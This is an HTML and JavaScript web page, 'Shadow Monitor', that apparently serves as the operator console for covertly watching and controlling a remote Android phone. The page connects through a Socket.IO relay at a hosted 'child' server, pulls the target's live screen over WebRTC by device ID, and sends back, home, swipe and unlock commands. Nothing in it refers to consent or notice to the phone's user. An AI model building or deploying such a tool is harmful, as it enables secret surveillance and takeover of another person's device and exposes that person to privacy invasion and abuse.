<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shadow Monitor - Live View</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>

    <style>
        :root {
            --phone-bg: #000;
            --bezel: #1a1a1a;
            --accent: #00f3ff;
            --glass: rgba(255, 255, 255, 0.1);
        }

        body {
            background: #121212;
            background-image: radial-gradient(#2a2a2a 1px, transparent 1px);
            background-size: 20px 20px;
            color: white;
            font-family: 'Poppins', sans-serif;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        /* --- PHONE CHASSIS (THE FRAME) --- */
        .phone-frame {
            width: 320px;
            height: 680px;
            background: var(--phone-bg);
            border: 12px solid var(--bezel);
            border-radius: 40px;
            position: relative;
            box-shadow: 0 0 0 2px #333, 0 20px 50px rgba(0,0,0,0.7);
            overflow: hidden;
            transition: transform 0.3s;
        }

        /* Camera Notch */
        .notch {
            position: absolute;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            height: 20px;
            background: var(--bezel);
            border-bottom-left-radius: 12px;
            border-bottom-right-radius: 12px;
            z-index: 100;
        }

        /* --- SCREEN AREA --- */
        .screen {
            width: 100%;
            height: 100%;
            position: relative;
            background: #050505;
            display: flex;
            flex-direction: column;
        }

        /* Video Stream */
        video {
            width: 100%;
            height: 100%;
            object-fit: fill; /* Stretch to fill phone screen */
            background: black;
        }

        /* --- OVERLAY (Login Screen) --- */
        .overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 50;
            backdrop-filter: blur(5px);
        }

        .overlay h2 { margin: 0 0 20px 0; color: var(--accent); letter-spacing: 2px; }
        
        input {
            background: #222; border: 1px solid #444; color: white;
            padding: 12px; border-radius: 8px; width: 70%;
            text-align: center; font-size: 16px; margin-bottom: 15px;
            outline: none;
        }
        
        button.connect-btn {
            background: var(--accent); color: black; border: none;
            padding: 12px 30px; border-radius: 30px; font-weight: bold;
            cursor: pointer; transition: 0.2s;
            box-shadow: 0 0 15px rgba(0, 243, 255, 0.4);
        }
        button.connect-btn:hover { transform: scale(1.05); }

        /* --- ANDROID NAVIGATION BAR (Overlay) --- */
        .nav-bar {
            position: absolute;
            bottom: 10px;
            left: 0;
            width: 100%;
            height: 50px;
            display: flex;
            justify-content: space-evenly;
            align-items: center;
            background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
            z-index: 20;
        }

        .nav-btn {
            color: rgba(255,255,255,0.7);
            font-size: 1.2rem;
            cursor: pointer;
            padding: 10px;
            transition: 0.2s;
        }
        .nav-btn:active { color: white; transform: scale(0.9); }

        /* --- EXTERNAL CONTROLS (Below Phone) --- */
        .external-controls {
            margin-top: 20px;
            display: flex;
            gap: 15px;
        }

        .tool-btn {
            background: #222;
            border: 1px solid #444;
            color: #ccc;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 1.2rem;
            transition: 0.2s;
        }
        .tool-btn:hover { background: #333; color: var(--accent); }
        .tool-btn:active { transform: scale(0.9); }

        .status-badge {
            position: absolute;
            top: 20px;
            right: 20px;
            font-size: 12px;
            color: #666;
            font-weight: bold;
        }
        .status-badge.live { color: #00ff88; text-shadow: 0 0 10px #00ff88; }
        .status-badge.error { color: #ff4444; }

    </style>
</head>
<body>

    <div class="status-badge" id="statusText">Disconnected</div>

    <div class="phone-frame">
        <div class="notch"></div>
        
        <div class="screen">
            <div class="overlay" id="connectOverlay">
                <i class="fa-solid fa-mobile-screen" style="font-size: 40px; margin-bottom: 20px; color: #444;"></i>
                <h2>SHADOW</h2>
                <input type="text" id="deviceId" placeholder="Enter Device ID">
                <button class="connect-btn" onclick="startViewing()">CONNECT</button>
            </div>

            <video id="remoteVideo" autoplay playsinline muted></video>

            <div class="nav-bar">
                <i class="fa-solid fa-chevron-left nav-btn" onclick="sendCmd('back')"></i> 
                <i class="fa-regular fa-circle nav-btn" onclick="sendCmd('home')" style="font-size: 1rem;"></i> 
                <i class="fa-regular fa-square nav-btn" onclick="sendCmd('recent')" style="font-size: 1rem;"></i> 
            </div>
        </div>
    </div>

    <div class="external-controls">
        <div class="tool-btn" onclick="sendCmd('swipe_up')" title="Swipe Up"><i class="fa-solid fa-arrow-up"></i></div>
        <div class="tool-btn" onclick="sendCmd('swipe_down')" title="Swipe Down"><i class="fa-solid fa-arrow-down"></i></div>
        <div class="tool-btn" onclick="sendCmd('unlock')" title="Unlock/Wake"><i class="fa-solid fa-power-off"></i></div>
    </div>

    <script>
        // âœ… SERVER URL
        const SOCKET_URL = "https://child-v9no.onrender.com"; 
        
        let socket;
        let peerConnection;
        const config = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };

        const statusEl = document.getElementById("statusText");
        const overlayEl = document.getElementById("connectOverlay");
        const videoEl = document.getElementById("remoteVideo");

        // Auto-fill ID from URL if present (?id=123456)
        const urlParams = new URLSearchParams(window.location.search);
        if(urlParams.get('id')) document.getElementById("deviceId").value = urlParams.get('id');

        function startViewing() {
            const deviceId = document.getElementById("deviceId").value;
            if(!deviceId) return alert("Please enter Device ID");

            statusEl.innerText = "Connecting...";
            
            // Clean up existing socket if any
            if(socket) socket.disconnect();
            
            socket = io(SOCKET_URL, { transports: ['websocket', 'polling'] });

            socket.on("connect", () => {
                console.log("âœ… Socket Connected");
                statusEl.innerText = "Waiting for Device...";
                statusEl.className = "status-badge";
                
                // Join room to listen for this specific device
                socket.emit("join-room", "VIEWER"); 
            });

            // ðŸŸ¢ CRITICAL: Handle Offer (Auto-Reconnect Logic)
            socket.on("offer", async (data) => {
                // Filter: Check if this offer is for the device we want to watch
                if (data.target !== deviceId && data.target !== "VIEWER") {
                    console.log("Ignored offer for other device: " + data.target);
                    return; 
                }

                console.log("ðŸ“¡ Offer Received. Resetting Connection...");
                statusEl.innerText = "Negotiating...";
                statusEl.className = "status-badge live";

                // ðŸ›‘ 1. Close Old Connection (This fixes the refresh issue)
                if (peerConnection) {
                    peerConnection.close();
                    peerConnection = null;
                }
                
                // ðŸ†• 2. Create New Connection
                createPeerConnection(deviceId);

                try {
                    // Safe Parsing
                    let offerDesc = data.offer;
                    if (typeof offerDesc === 'string') offerDesc = JSON.parse(offerDesc);
                    
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(offerDesc));
                    const answer = await peerConnection.createAnswer();
                    await peerConnection.setLocalDescription(answer);

                    socket.emit("answer", { target: deviceId, answer: answer });
                    console.log("âœ… Answer Sent");
                } catch (err) {
                    console.error("Handshake Error:", err);
                    statusEl.innerText = "Error";
                    statusEl.className = "status-badge error";
                }
            });

            socket.on("candidate", async (data) => {
                if (peerConnection) {
                    try {
                        let candidateData = data.candidate;
                        if (candidateData && candidateData.candidate && typeof candidateData.candidate === 'object') {
                            candidateData = candidateData.candidate;
                        }
                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidateData));
                    } catch (e) {
                        // Suppress candidate errors (common during renegotiation)
                    }
                }
            });

            socket.on("disconnect", () => {
                statusEl.innerText = "Disconnected";
                statusEl.className = "status-badge error";
                overlayEl.style.display = "flex"; // Show Login Screen again
            });

            // Hide overlay on successful start
            overlayEl.style.display = "none";
        }

        function createPeerConnection(targetId) {
            peerConnection = new RTCPeerConnection(config);

            peerConnection.ontrack = (event) => {
                console.log("ðŸŽ¥ Stream Started");
                statusEl.innerText = "LIVE: " + targetId;
                statusEl.className = "status-badge live";
                videoEl.srcObject = event.streams[0];
            };

            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit("candidate", { target: targetId, candidate: event.candidate });
                }
            };

            peerConnection.onconnectionstatechange = () => {
                console.log("ICE State:", peerConnection.connectionState);
                if(peerConnection.connectionState === 'disconnected' || peerConnection.connectionState === 'failed') {
                    statusEl.innerText = "Reconnecting...";
                    statusEl.className = "status-badge error";
                    // Do not close PC here, let the new Offer handle the cleanup
                }
            };
        }

        function sendCmd(action) {
            const deviceId = document.getElementById("deviceId").value;
            if(socket && socket.connected) {
                // Optional: Visual feedback
                console.log("Sending Command:", action);
                socket.emit("control-event", { room: deviceId, action: action });
            } else {
                alert("Please connect first!");
            }
        }
    </script>

</body>
</html>
